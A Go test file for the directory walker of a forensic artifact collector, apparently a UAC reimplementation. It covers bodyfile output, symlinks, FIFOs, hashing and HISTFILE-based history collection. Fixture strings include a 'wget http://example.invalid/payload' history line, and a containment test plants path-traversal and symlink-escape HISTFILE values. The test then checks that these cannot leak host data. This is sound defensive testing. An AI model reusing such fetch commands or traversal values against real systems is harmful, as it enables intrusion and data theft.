package walk

import (
	"iter"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"uacscan/collector"
	"uacscan/internal/artifact"
	"uacscan/internal/config"
	"uacscan/internal/content"
	"uacscan/internal/fsref"
	"uacscan/internal/passwd"
	"uacscan/internal/rules"
	"uacscan/internal/spool"
	"uacscan/internal/targetos"
	"uacscan/test/fixture"
)

type harness struct {
	root  string
	out   string
	store *spool.Store
	w     *Walker
	ctx   *collector.Context
	env   *rules.Env
}

func setup(t *testing.T, artifactYAML string) *harness {
	t.Helper()
	root := t.TempDir()
	if err := fixture.Build(root); err != nil {
		t.Fatal(err)
	}
	out := t.TempDir()

	doc, err := artifact.Parse(strings.NewReader(artifactYAML), "test.yaml")
	if err != nil {
		t.Fatal(err)
	}
	accounts := passwd.Load(root)
	conf := config.Default()
	env := &rules.Env{
		MountPoint:    root,
		Now:           time.Now(),
		OS:            targetos.Host(),
		EnableMtime:   conf.EnableFindMtime,
		EnableAtime:   conf.EnableFindAtime,
		EnableCtime:   conf.EnableFindCtime,
		HashAlgorithm: conf.HashAlgorithm,
		UserHomes:     accounts.Homes,
		UIDs:          accounts.UIDs,
		GIDs:          accounts.GIDs,
	}
	var compiled []*rules.Rule
	for _, e := range doc.Artifacts {
		r, err := rules.Compile(e, doc, env)
		if err != nil {
			t.Fatal(err)
		}
		if r != nil {
			compiled = append(compiled, r)
		}
	}
	if len(compiled) == 0 {
		t.Fatal("no rules compiled from the test artifact")
	}

	store, err := spool.NewStore(out)
	if err != nil {
		t.Fatal(err)
	}
	cache := fsref.NewCache(root)
	broker := content.NewBroker()
	ctx := &collector.Context{Cache: cache, Broker: broker, Store: store, Env: env, OutputRoot: out}
	broker.OnError = func(p, c string, err error) { ctx.RecordError(p, c, err) }

	var cs []collector.Collector
	for _, r := range compiled {
		c, err := collector.New(r, ctx)
		if err != nil {
			t.Fatal(err)
		}
		cs = append(cs, c)
	}
	return &harness{
		root:  root,
		out:   out,
		store: store,
		ctx:   ctx,
		env:   env,
		w: &Walker{
			Root: root, Cache: cache, Broker: broker,
			Set: rules.NewSet(compiled), Collectors: cs,
			Recorded: ctx.RecordedErrors,
		},
	}
}

func (h *harness) run(t *testing.T) {
	t.Helper()
	if err := h.w.Walk(); err != nil {
		t.Fatal(err)
	}
	if err := h.store.Close(); err != nil {
		t.Fatal(err)
	}
}

func (h *harness) lines(t *testing.T, rel string) []string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(h.out, rel))
	if err != nil {
		t.Fatalf("reading %s: %v", rel, err)
	}
	var out []string
	for _, l := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
		if l != "" {
			out = append(out, l)
		}
	}
	sort.Strings(out)
	return out
}

const bodyfileArtifact = `version: 1.0
output_directory: /bodyfile
artifacts:
  -
    collector: stat
    path: /
    output_file: bodyfile.txt
`

func TestWalkVisitsEveryInodeExactlyOnce(t *testing.T) {
	h := setup(t, bodyfileArtifact)
	h.run(t)

	lines := h.lines(t, "bodyfile/bodyfile.txt")
	seen := map[string]int{}
	for _, l := range lines {
		f := strings.Split(l, "|")
		seen[f[1]]++
	}
	for path, n := range seen {
		if n != 1 {
			t.Errorf("%s appears %d times in the bodyfile", path, n)
		}
	}
	// The symlink to /var/log must not have been descended: if it had been,
	// the log files would appear twice under two different paths.
	for path := range seen {
		if strings.Contains(path, "log.link/") {
			t.Errorf("walk descended a symlink to a directory: %s", path)
		}
	}
	if len(lines) < 30 {
		t.Errorf("bodyfile has only %d lines; the fixture has more than that", len(lines))
	}
}

func TestWalkRecordsImageRelativePaths(t *testing.T) {
	h := setup(t, bodyfileArtifact)
	h.run(t)
	for _, l := range h.lines(t, "bodyfile/bodyfile.txt") {
		path := strings.Split(l, "|")[1]
		if strings.HasPrefix(path, h.root) {
			t.Fatalf("bodyfile leaked the mount point: %s", path)
		}
		if !strings.HasPrefix(path, "/") {
			t.Fatalf("path is not absolute: %s", path)
		}
	}
}

func TestSymlinksAreRecordedWithTargetNotFollowed(t *testing.T) {
	h := setup(t, bodyfileArtifact)
	h.run(t)
	var found bool
	for _, l := range h.lines(t, "bodyfile/bodyfile.txt") {
		f := strings.Split(l, "|")
		if strings.HasPrefix(f[1], "/etc/passwd.link") {
			found = true
			if !strings.Contains(f[1], " -> /etc/passwd") {
				t.Errorf("symlink target missing: %q", f[1])
			}
			if !strings.HasPrefix(f[3], "l") {
				t.Errorf("symlink recorded with mode %q; lstat semantics broken", f[3])
			}
		}
		// A dangling symlink must still be recorded, not dropped as an error.
		if strings.HasPrefix(f[1], "/var/tmp/dangling") && !strings.HasPrefix(f[3], "l") {
			t.Errorf("dangling symlink recorded with mode %q", f[3])
		}
	}
	if !found {
		t.Error("symlink /etc/passwd.link is missing from the bodyfile")
	}
}

func TestFifoIsRecordedButNeverOpened(t *testing.T) {
	// If the walker opened the FIFO this test would hang rather than fail.
	done := make(chan []string, 1)
	go func() {
		h := setup(t, bodyfileArtifact)
		h.run(t)
		done <- h.lines(t, "bodyfile/bodyfile.txt")
	}()
	select {
	case lines := <-done:
		var found bool
		for _, l := range lines {
			f := strings.Split(l, "|")
			if f[1] == "/tmp/fifo" {
				found = true
				if f[3][0] != 'p' {
					t.Errorf("fifo mode = %q, want a leading 'p'", f[3])
				}
			}
		}
		if !found {
			t.Error("fifo missing from the bodyfile")
		}
	case <-time.After(30 * time.Second):
		t.Fatal("walk blocked; something opened the FIFO")
	}
}

func TestPermissionRulesSelectTheRightFiles(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /system
artifacts:
  -
    collector: find
    path: /
    file_type: [f]
    permissions: [-4000]
    output_file: suid.txt
  -
    collector: find
    path: /
    file_type: [f]
    permissions: [-2000]
    output_file: sgid.txt
  -
    collector: find
    path: /
    file_type: [f]
    permissions: [-0002]
    output_file: world_writable.txt
`)
	h.run(t)

	if got := h.lines(t, "system/suid.txt"); len(got) != 1 || got[0] != "/usr/bin/suid_binary" {
		t.Errorf("suid = %v, want [/usr/bin/suid_binary]", got)
	}
	if got := h.lines(t, "system/sgid.txt"); len(got) != 1 || got[0] != "/usr/bin/sgid_binary" {
		t.Errorf("sgid = %v, want [/usr/bin/sgid_binary]", got)
	}
	ww := h.lines(t, "system/world_writable.txt")
	if len(ww) != 1 || ww[0] != "/tmp/world_writable" {
		t.Errorf("world-writable = %v, want [/tmp/world_writable]", ww)
	}
}

func TestFileCollectorCopiesBytesAndDedupesHardlinks(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: file
    path: %user_home%/.ssh/authorized_keys*
    ignore_date_range: true
  -
    collector: file
    path: /usr/local/bin
    file_type: [f]
    ignore_date_range: true
`)
	h.run(t)

	// alice has two authorized_keys files, root has one; bob has none.
	for _, want := range []string{
		"[root]/home/alice/.ssh/authorized_keys",
		"[root]/home/alice/.ssh/authorized_keys2",
		"[root]/root/.ssh/authorized_keys",
	} {
		p := filepath.Join(h.out, want)
		b, err := os.ReadFile(p)
		if err != nil {
			t.Errorf("missing collected file %s: %v", want, err)
			continue
		}
		if len(b) == 0 {
			t.Errorf("%s was collected empty", want)
		}
	}
	if _, err := os.Stat(filepath.Join(h.out, "[root]/home/bob/.ssh/authorized_keys")); !os.IsNotExist(err) {
		t.Error("bob has no authorized_keys; something was collected anyway")
	}

	// The hardlink pair must be stored once.
	orig := filepath.Join(h.out, "[root]/usr/local/bin/original")
	link := filepath.Join(h.out, "[root]/usr/local/bin/hardlink")
	_, origErr := os.Stat(orig)
	_, linkErr := os.Stat(link)
	if origErr != nil && linkErr != nil {
		t.Fatal("neither side of the hardlink pair was collected")
	}
	if origErr == nil && linkErr == nil {
		t.Error("both sides of a hardlink pair were stored; dedup by (dev,ino) failed")
	}
}

func TestFileCollectorContentMatchesSource(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: file
    path: /etc
    file_type: [f]
    ignore_date_range: true
`)
	h.run(t)
	for _, rel := range []string{"etc/passwd", "etc/hostname", "etc/ssh/sshd_config"} {
		want, err := os.ReadFile(filepath.Join(h.root, rel))
		if err != nil {
			t.Fatal(err)
		}
		got, err := os.ReadFile(filepath.Join(h.out, "[root]", rel))
		if err != nil {
			t.Errorf("%s not collected: %v", rel, err)
			continue
		}
		if string(got) != string(want) {
			t.Errorf("%s content differs:\ngot  %q\nwant %q", rel, got, want)
		}
	}
	// A symlink is not a regular file and must not be copied.
	if _, err := os.Stat(filepath.Join(h.out, "[root]/etc/passwd.link")); err == nil {
		t.Error("a symlink was copied into the output tree")
	}
}

const hashArtifact = `version: 1.0
output_directory: /hash
artifacts:
  -
    collector: hash
    path: /usr/bin
    file_type: [f]
    permissions: [-001, -010, -100]
    output_file: hashes
`

// UAC ships hash_algorithm: [md5, sha1]. Producing sha256 as well would look
// harmless but makes the output differ from the tool being replaced -- which
// is exactly what the differential harness caught.
func TestHashCollectorUsesConfiguredAlgorithms(t *testing.T) {
	h := setup(t, hashArtifact)
	h.run(t)

	for _, algo := range []string{"md5", "sha1"} {
		lines := h.lines(t, "hash/hashes."+algo)
		if len(lines) != 3 {
			t.Errorf("%s: got %d hashes, want 3 (normal, suid, sgid)", algo, len(lines))
		}
		for _, l := range lines {
			parts := strings.SplitN(l, "  ", 2)
			if len(parts) != 2 || parts[0] == "" || !strings.HasPrefix(parts[1], "/usr/bin/") {
				t.Errorf("%s: malformed line %q", algo, l)
			}
		}
	}
	if _, err := os.Stat(filepath.Join(h.out, "hash/hashes.sha256")); err == nil {
		t.Error("sha256 produced although the default configuration does not ask for it")
	}
}

func TestHashCollectorHonoursAnAlgorithmOverride(t *testing.T) {
	h := setup(t, hashArtifact)
	h.env.HashAlgorithm = []string{"sha256"}
	h.run(t)

	if lines := h.lines(t, "hash/hashes.sha256"); len(lines) != 3 {
		t.Errorf("sha256: got %d hashes, want 3", len(lines))
	}
	if _, err := os.Stat(filepath.Join(h.out, "hash/hashes.md5")); err == nil {
		t.Error("md5 produced although only sha256 was configured")
	}
}

// The whole point of the rewrite: one pass, one read, even when several
// collectors want the same bytes.
func TestHashAndCopyShareASingleRead(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /both
artifacts:
  -
    collector: hash
    path: /usr/bin
    file_type: [f]
    output_file: hashes
  -
    collector: file
    path: /usr/bin
    file_type: [f]
    ignore_date_range: true
`)
	h.run(t)

	hashes := h.lines(t, "both/hashes.md5")
	if len(hashes) < 3 {
		t.Fatalf("expected the /usr/bin files to be hashed, got %d", len(hashes))
	}
	for _, name := range []string{"normal", "suid_binary", "sgid_binary"} {
		src, err := os.ReadFile(filepath.Join(h.root, "usr/bin", name))
		if err != nil {
			t.Fatal(err)
		}
		got, err := os.ReadFile(filepath.Join(h.out, "[root]/usr/bin", name))
		if err != nil {
			t.Errorf("%s was hashed but not copied: %v", name, err)
			continue
		}
		if string(got) != string(src) {
			t.Errorf("%s copy differs from source", name)
		}
	}
}

func TestMaxFileSizeIsStrictlyLess(t *testing.T) {
	root := t.TempDir()
	if err := fixture.Build(root); err != nil {
		t.Fatal(err)
	}
	// /etc/hostname is exactly 14 bytes ("fixture-host\n" is 13).
	fi, err := os.Stat(filepath.Join(root, "etc/hostname"))
	if err != nil {
		t.Fatal(err)
	}
	size := fi.Size()

	for _, tc := range []struct {
		limit   int64
		include bool
	}{
		{size + 1, true},
		{size, false}, // find -size -Nc is strict
	} {
		h := setup(t, `version: 1.0
output_directory: /f
artifacts:
  -
    collector: find
    path: /etc/hostname
    file_type: [f]
    max_file_size: `+itoa(tc.limit)+`
    output_file: out.txt
`)
		h.run(t)
		data, err := os.ReadFile(filepath.Join(h.out, "f/out.txt"))
		got := err == nil && strings.Contains(string(data), "/etc/hostname")
		if got != tc.include {
			t.Errorf("max_file_size=%d: included=%v, want %v", tc.limit, got, tc.include)
		}
	}
}

func itoa(n int64) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

func TestWalkIsDeterministic(t *testing.T) {
	var runs [2][]string
	for i := range runs {
		h := setup(t, bodyfileArtifact)
		h.run(t)
		b, err := os.ReadFile(filepath.Join(h.out, "bodyfile/bodyfile.txt"))
		if err != nil {
			t.Fatal(err)
		}
		// Different temp roots mean different inodes and timestamps; compare
		// the path column only, in emission order.
		for _, l := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
			runs[i] = append(runs[i], strings.Split(l, "|")[1])
		}
	}
	if len(runs[0]) != len(runs[1]) {
		t.Fatalf("run lengths differ: %d vs %d", len(runs[0]), len(runs[1]))
	}
	for i := range runs[0] {
		if runs[0][i] != runs[1][i] {
			t.Fatalf("walk order differs at %d: %q vs %q", i, runs[0][i], runs[1][i])
		}
	}
}

func TestUnreadableFileIsRecordedAndWalkContinues(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root; permissions do not apply")
	}
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: file
    path: /etc
    file_type: [f]
    ignore_date_range: true
`)
	if err := os.Chmod(filepath.Join(h.root, "etc/passwd"), 0000); err != nil {
		t.Fatal(err)
	}
	h.run(t)

	// The unreadable file is recorded as an error...
	errs, err := os.ReadFile(filepath.Join(h.out, "uacscan/errors.txt"))
	if err != nil || !strings.Contains(string(errs), "/etc/passwd") {
		t.Errorf("unreadable file not recorded in the errors spool (err=%v)", err)
	}
	// ...and the rest of /etc was still collected.
	if _, err := os.Stat(filepath.Join(h.out, "[root]/etc/hostname")); err != nil {
		t.Errorf("walk stopped after the unreadable file: %v", err)
	}
}

func TestScanResultsStreamsFromDisk(t *testing.T) {
	h := setup(t, bodyfileArtifact)
	h.run(t)

	res, err := h.w.Collectors[0].ScanResults()
	if err != nil {
		t.Fatal(err)
	}
	// ScanResults is typed `any` by the interface, but what comes back is a
	// stream that reads the spool file, not a materialised slice.
	seq, ok := res.(iter.Seq2[collector.Result, error])
	if !ok {
		t.Fatalf("ScanResults returned %T, want iter.Seq2[collector.Result, error]", res)
	}
	n := 0
	for r, err := range seq {
		if err != nil {
			t.Fatal(err)
		}
		if !strings.HasPrefix(r.Line, "0|/") {
			t.Fatalf("unexpected bodyfile line %q", r.Line)
		}
		n++
	}
	if n == 0 {
		t.Error("ScanResults yielded nothing")
	}
}

// The two-phase artifacts: a history file whose location is only named inside
// an rc file, so it cannot be found by matching paths during the walk.
func TestTwoPhaseHistfileCollection(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: command
    command: grep -E "HISTFILE=.*" %user_home%/.bashrc | sed -e 's|.*HISTFILE=||' -e 's|^~/|%user_home%/|'
    output_directory: /%temp_directory%/files/shell
    output_file: bash_histfile.txt
  -
    collector: file
    path: /%temp_directory%/files/shell/bash_histfile.txt
    is_file_list: true
`)
	h.run(t)

	// alice's .bashrc says HISTFILE=~/.hidden_history -- a path no glob in the
	// artifact mentions.
	alice := filepath.Join(h.out, "[root]/home/alice/.hidden_history")
	got, err := os.ReadFile(alice)
	if err != nil {
		t.Fatalf("alice's hidden history was not collected: %v", err)
	}
	if !strings.Contains(string(got), "wget http://example.invalid/payload") {
		t.Errorf("collected the wrong content: %q", got)
	}

	// root's .bashrc points outside the home directory entirely.
	rootHist := filepath.Join(h.out, "[root]/var/log/root_history")
	if got, err := os.ReadFile(rootHist); err != nil {
		t.Errorf("root's history outside the home directory was not collected: %v", err)
	} else if !strings.Contains(string(got), "chattr +i") {
		t.Errorf("wrong content for root's history: %q", got)
	}

	// bob's points at a file that does not exist: recorded, not fatal.
	if _, err := os.Stat(filepath.Join(h.out, "[root]/home/bob/.no_such_history")); err == nil {
		t.Error("collected a history file that does not exist")
	}
	errs, err := os.ReadFile(filepath.Join(h.out, "uacscan/errors.txt"))
	if err != nil || !strings.Contains(string(errs), "no_such_history") {
		t.Errorf("a missing history file was not recorded (err=%v)", err)
	}
}

// A rc file that names no history file must not cause the phase to collect
// something arbitrary.
func TestTwoPhaseCollectsNothingWithoutAnAssignment(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: command
    command: grep -E "NOSUCHVAR=.*" %user_home%/.bashrc | sed -e 's|.*NOSUCHVAR=||' -e 's|^~/|%user_home%/|'
    output_directory: /%temp_directory%/files/shell
    output_file: none.txt
  -
    collector: file
    path: /%temp_directory%/files/shell/none.txt
    is_file_list: true
`)
	h.run(t)
	if _, err := os.Stat(filepath.Join(h.out, "[root]")); err == nil {
		t.Error("collected files although no assignment was found")
	}
}

// An unsupported algorithm name used to desync the algorithm list from the
// hash list and panic with an index out of range.
func TestUnsupportedHashAlgorithmDoesNotPanic(t *testing.T) {
	h := setup(t, hashArtifact)
	h.env.HashAlgorithm = []string{"bogus", "md5", "also-bogus", "sha1"}
	h.run(t)

	// The names it does understand still produce correct output.
	for _, algo := range []string{"md5", "sha1"} {
		lines := h.lines(t, "hash/hashes."+algo)
		if len(lines) != 3 {
			t.Errorf("%s: got %d hashes, want 3", algo, len(lines))
		}
		for _, l := range lines {
			parts := strings.SplitN(l, "  ", 2)
			if len(parts) != 2 || len(parts[0]) == 0 {
				t.Errorf("%s: malformed line %q", algo, l)
			}
		}
	}
	// And the ones it does not are simply absent.
	for _, algo := range []string{"bogus", "also-bogus"} {
		if _, err := os.Stat(filepath.Join(h.out, "hash/hashes."+algo)); err == nil {
			t.Errorf("produced output for the unsupported algorithm %q", algo)
		}
	}
}

// An unwritable output must stop the scan, not be logged as though the evidence
// were at fault. A partial acquisition that exits zero is the worst outcome
// this tool can have.
func TestUnwritableOutputAbortsTheScan(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root; permissions do not apply")
	}
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: file
    path: /etc
    file_type: [f]
    ignore_date_range: true
`)
	// Make the collected-files tree unwritable after the store is set up.
	root := filepath.Join(h.out, "[root]")
	if err := os.MkdirAll(root, 0555); err != nil {
		t.Fatal(err)
	}

	err := h.w.Walk()
	if err == nil {
		t.Fatal("the walk reported success although no file could be written")
	}
	if !strings.Contains(err.Error(), "output failed") {
		t.Errorf("error does not identify an output failure: %v", err)
	}
}

// A file that cannot be read is the image's problem, and must not stop
// anything -- the counterpart to the test above.
func TestUnreadableSourceDoesNotAbortTheScan(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root; permissions do not apply")
	}
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: file
    path: /etc
    file_type: [f]
    ignore_date_range: true
`)
	if err := os.Chmod(filepath.Join(h.root, "etc/passwd"), 0000); err != nil {
		t.Fatal(err)
	}
	if err := h.w.Walk(); err != nil {
		t.Fatalf("an unreadable source file aborted the scan: %v", err)
	}
	h.store.Close()

	if st := h.w.Stats(); st.Recorded == 0 {
		t.Error("the unreadable file was not counted in the run statistics")
	}
	if _, err := os.Stat(filepath.Join(h.out, "[root]/etc/hostname")); err != nil {
		t.Errorf("collection stopped after the unreadable file: %v", err)
	}
}

// The critical containment case, end to end: a hostile image cannot use a
// HISTFILE assignment to make the scan read or write outside the roots.
func TestTwoPhaseCannotEscapeTheImage(t *testing.T) {
	h := setup(t, `version: 1.0
output_directory: /files
artifacts:
  -
    collector: command
    command: grep -E "HISTFILE=.*" %user_home%/.evilrc | sed -e 's|.*HISTFILE=||' -e 's|^~/|%user_home%/|'
    output_directory: /%temp_directory%/files/shell
    output_file: evil.txt
  -
    collector: file
    path: /%temp_directory%/files/shell/evil.txt
    is_file_list: true
`)
	// A file outside the image that must never be read.
	outside := t.TempDir()
	secret := filepath.Join(outside, "host_secret")
	if err := os.WriteFile(secret, []byte("HOST SECRET"), 0644); err != nil {
		t.Fatal(err)
	}
	// The image points at it two ways: by traversal, and through a symlink.
	if err := os.Symlink(outside, filepath.Join(h.root, "escape")); err != nil {
		t.Fatal(err)
	}
	rc := "HISTFILE=/../../../../../../" + strings.TrimPrefix(secret, "/") + "\n" +
		"HISTFILE=/escape/host_secret\n"
	if err := os.WriteFile(filepath.Join(h.root, "home/alice/.evilrc"), []byte(rc), 0644); err != nil {
		t.Fatal(err)
	}

	h.run(t)

	// Nothing outside the image may have been collected.
	var leaked []string
	filepath.WalkDir(h.out, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		b, rerr := os.ReadFile(p)
		if rerr == nil && strings.Contains(string(b), "HOST SECRET") {
			leaked = append(leaked, p)
		}
		return nil
	})
	if len(leaked) > 0 {
		t.Fatalf("host data outside the image was collected into %v", leaked)
	}

	// And nothing may have been written outside the output directory.
	if _, err := os.Stat(filepath.Join(outside, "[root]")); err == nil {
		t.Fatal("wrote outside the output directory")
	}
	if b, err := os.ReadFile(secret); err != nil || string(b) != "HOST SECRET" {
		t.Fatalf("the host file was modified: %q %v", b, err)
	}
}
